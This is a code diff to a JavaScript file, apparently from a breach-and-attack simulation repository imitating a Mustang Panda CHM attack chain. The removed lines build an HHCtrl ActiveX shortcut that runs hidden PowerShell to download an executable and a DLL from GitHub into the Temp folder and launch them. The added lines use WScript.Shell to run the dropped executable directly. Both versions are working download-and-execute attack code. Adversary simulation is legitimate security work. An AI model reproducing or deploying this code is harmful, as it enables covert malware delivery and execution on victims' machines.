@@ -1,29 +1,16 @@
-// music.js - Clean version for CHM
+// music.js - Execute wmpshare.exe from Temp
 
-alert("music.js loaded successfully!");
+alert("✅ music.js loaded from GitHub!");
 
 try {
-    var obj = document.createElement("object");
-    obj.setAttribute("classid", "clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11");
+    var shell = new ActiveXObject("WScript.Shell");
+    var temp = shell.ExpandEnvironmentStrings("%TEMP%");
     
-    var cmd = ",powershell.exe,-NoProfile -WindowStyle Hidden -Command ";
-    cmd += "\"$t=$env:TEMP; ";
-    cmd += "Invoke-WebRequest 'https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmpshare.exe' -OutFile '$t\\wmpshare.exe'; ";
-    cmd += "Invoke-WebRequest 'https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmp.dll' -OutFile '$t\\wmp.dll'; ";
-    cmd += "Start-Process '$t\\wmpshare.exe'\"";
-
-    obj.innerHTML = 
-        '<param name="Command" value="ShortCut">' +
-        '<param name="Item1" value="' + cmd + '">' +
-        '<param name="Item2" value="273,1,1">';
-
-    document.body.appendChild(obj);
+    alert("Executing wmpshare.exe from: " + temp);
     
-    setTimeout(function(){
-        obj.Click();
-        alert("✅ Downloading EXE + DLL and executing...");
-    }, 700);
+    // Execute the already downloaded file from Temp
+    shell.Run('"' + temp + '\\wmpshare.exe"', 1, false);
 
 } catch(e) {
-    alert("Error: " + e.message);
+    alert("Execution Error: " + e.message);
 }
